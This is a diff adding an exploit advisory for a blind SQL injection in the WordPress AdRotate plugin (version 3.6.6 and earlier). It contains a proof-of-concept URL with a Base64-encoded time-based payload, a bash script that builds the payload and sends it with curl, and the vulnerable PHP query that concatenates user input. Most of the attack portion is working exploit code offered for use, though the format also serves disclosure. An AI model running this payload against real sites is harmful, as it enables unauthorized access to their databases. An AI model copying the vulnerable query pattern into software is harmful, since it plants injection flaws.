@@ -1,0 +1,28 @@
+# Exploit Title: WordPress AdRotate plugin <= 3.6.6 SQL Injection Vulnerability
+# Date: 2011-11-8
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/adrotate.3.6.6.zip
+# Version: 3.6.6 (tested)
+# Note: parameter $_GET["track"] has to be Base64 encoded
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/adrotate/adrotate-out.php?track=MScgQU5EIDE9SUYoMj4xLEJFTkNITUFSSyg1MDAwMDAwLE1ENShDSEFSKDExNSwxMTMsMTA4LDEwOSw5NywxMTIpKSksMCkj
+
+e.g.
+#!/bin/bash
+payload="1' AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)#"
+encoded=`echo -n "1' AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)#" | base64 -w 0`
+curl http://www.site.com/wp-content/plugins/adrotate/adrotate-out.php?track=$encoded
+
+---------------
+Vulnerable code
+---------------
+
+if(isset($_GET['track']) OR $_GET['track'] != '') {
+    $meta = base64_decode($_GET['track']);
+    ...
+    list($ad, $group, $block) = explode("-", $meta);
+    ...
+    $bannerurl = $wpdb->get_var($wpdb->prepare("SELECT `link` FROM `".$prefix."adrotate` WHERE `id` = '".$ad."' LIMIT 1;")); //wrong (mis)usage of wpdb->prepare()
